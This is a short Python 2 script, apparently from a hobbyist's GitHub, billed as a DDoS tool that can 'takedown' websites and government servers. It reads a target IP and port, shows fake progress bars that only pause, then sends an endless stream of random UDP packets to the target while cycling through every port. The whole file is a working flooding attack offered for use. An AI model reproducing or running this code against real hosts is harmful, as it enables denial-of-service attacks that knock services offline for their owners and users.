# ----------------------------------------------------------------------------------------------
# Century - iDDoS Tool
#
# DDoSing is the most massive type of web and server attack
# This tool can takedown strong webstites including goverment servers as well
# 
#
# author : Ghoul3r , version 1.0
# ----------------------------------------------------------------------------------------------
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print "Author   : Ghoul3r"
print "Github   : https://github.com/Ghoul3r"

ip = raw_input("IP Target: ")
port = input("Port: ")

os.system("clear")
os.system("figlet Preparing Attack")
def progressbar(it, prefix="", size=60, file=sys.stdout):
    count = len(it)

    def show(j):
        x = int(size * j / count)
        file.write(
            "%s[%s%s] %i/%i\r" % (prefix, "#" * x, "." * (size - x), j, count))
        file.flush()

    show(0)
    for i, item in enumerate(it):
        yield item
        show(i + 1)
    file.write("\n")
    file.flush()

for i in progressbar(range(100), "Fetching Packets: ", 30):
    time.sleep(0.02)
os.system('clear')
for i in progressbar(range(100), "Compliling Code: ", 30):
    time.sleep(0.09)
os.system('clear')
for i in progressbar(range(100), "Configuring Settings: ", 20):
    time.sleep(0.04)
os.system('clear')
for i in progressbar(range(100), "Loading: ", 20):
    time.sleep(0.01)
os.system("figlet DDoS Started")
time.sleep(3)
os.system('clear')
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packets to %s through port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
